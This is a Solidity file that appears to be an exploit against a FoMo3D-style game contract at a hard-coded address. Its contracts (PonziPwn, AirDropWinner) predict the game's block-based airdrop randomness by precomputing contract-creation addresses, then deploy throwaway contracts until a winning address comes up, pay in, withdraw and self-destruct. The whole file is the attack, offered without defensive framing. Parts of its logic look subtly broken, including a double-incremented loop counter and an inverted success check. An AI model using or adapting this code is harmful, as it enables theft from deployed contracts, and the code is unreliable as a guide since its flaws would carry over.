row number 
1	   pragma solidity ^0.4.24;
2	 interface FoMo3DlongInterface {
3	 function airDropTracker_() external returns (uint256);
4	 function airDropPot_() external returns (uint256);
5	 function withdraw() external;
6	 }
7	 contract BlankContract {
8	 constructor() public {
9	 }
10	 }
11	 contract AirDropWinner {
12	 FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
13	 constructor() public {
14	 if(!address(fomo3d).call.value(0.1 ether)()) {
15	 fomo3d.withdraw();
16	 selfdestruct(msg.sender);
17	 }
18	 }
19	 }
20	 contract PonziPwn {
21	 FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
22	 address private admin;
23	 uint256 private blankContractGasLimit = 20000;
24	 uint256 private pwnContractGasLimit = 250000;
25	 uint256 private gasPrice = 10;
26	 uint256 private gasPriceInWei = gasPrice*1e9;
27	 uint256 private blankContractCost = blankContractGasLimit*gasPrice ;
28	 uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;
29	 uint256 private maxAmount = 10 ether;
30	 modifier onlyAdmin() {
31	 require(msg.sender == admin);
32	 _;
33	 }
34	 constructor() public {
35	 admin = msg.sender;
36	 }
37	 function checkPwnData() private returns(uint256,uint256,address) {
38	 address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));
39	 uint256 _nContracts = 0;
40	 uint256 _pwnCost = 0;
41	 uint256 _seed = 0;
42	 uint256 _tracker = fomo3d.airDropTracker_();
43	 bool _canWin = false;
44	 while(!_canWin) {
45	 _seed = uint256(keccak256(abi.encodePacked( (block.timestamp) + (block.difficulty) + ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) + (block.gaslimit) + ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) + (block.number) )));
46	 if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {
47	 _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));
48	 _nContracts++;
49	 _pwnCost+= blankContractCost;
50	 }
51	 else {
52	 _canWin = true;
53	 _pwnCost += pwnContractCost;
54	 }
55	 }
56	 return (_pwnCost,_nContracts,_newSender);
57	 }
58	 function deployContracts(uint256 _nContracts,address _newSender) private {
59	 for(uint256 _i; _i < _nContracts; _i++) {
60	 if(_i++ == _nContracts) {
61	 address(_newSender).call.value(0.1 ether)();
62	 new AirDropWinner();
63	 }
64	 new BlankContract();
65	 }
66	 }
67	 function beginPwn() public onlyAdmin() {
68	 uint256 _pwnCost;
69	 uint256 _nContracts;
70	 address _newSender;
71	 (_pwnCost, _nContracts,_newSender) = checkPwnData();
72	 if(_pwnCost + 0.1 ether < maxAmount) {
73	 deployContracts(_nContracts,_newSender);
74	 }
75	 }
76	 function withdraw() public onlyAdmin() {
77	 admin.transfer(address(this).balance);
78	 }
79	 }
